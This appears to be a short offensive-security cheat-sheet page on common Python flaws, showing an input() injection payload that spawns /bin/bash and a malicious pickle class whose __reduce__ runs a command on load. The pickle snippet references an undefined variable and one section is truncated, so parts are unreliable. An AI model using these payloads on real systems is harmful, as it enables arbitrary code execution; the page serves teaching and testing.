# Python

Python is a language powering an extraordinary number of applications, but here we're just going to focus on very common coding errors you're likely to find. These can be useful in cases of both web applications as well as local and exploiting any of these is incredibly context specific.

## python2 input

I

```python
__import__('os').system('/bin/bash')
```

In python 3 this was removed, and raw\_input from python 2 replaced it.

## Pickle Deserialization

During pickle deserialization, it is possible to create a situation where arbitrary code is executed. This is because the reduce method defines how the object itself is de-serialized, and so will be executed when pickle.loads is called:

```python
import subprocess
class BadPickle(object):
    def __reduce__(self):
        return (subprocess.check_output, (chars,))
print cPickle.dumps(BadPickle())
```

**Further Reading**   
[https://blog.nelhage.com/2011/03/exploiting-pickle/   
](https://blog.nelhage.com/2011/03/exploiting-pickle/%20)[https://sensepost.com/blog/2010/playing-with-python-pickle-%231/   
](https://sensepost.com/blog/2010/playing-with-python-pickle-%231/%20)[https://dan.lousqui.fr/explaining-and-exploiting-deserialization-vulnerability-with-python-en.html](https://dan.lousqui.fr/explaining-and-exploiting-deserialization-vulnerability-with-python-en.html)
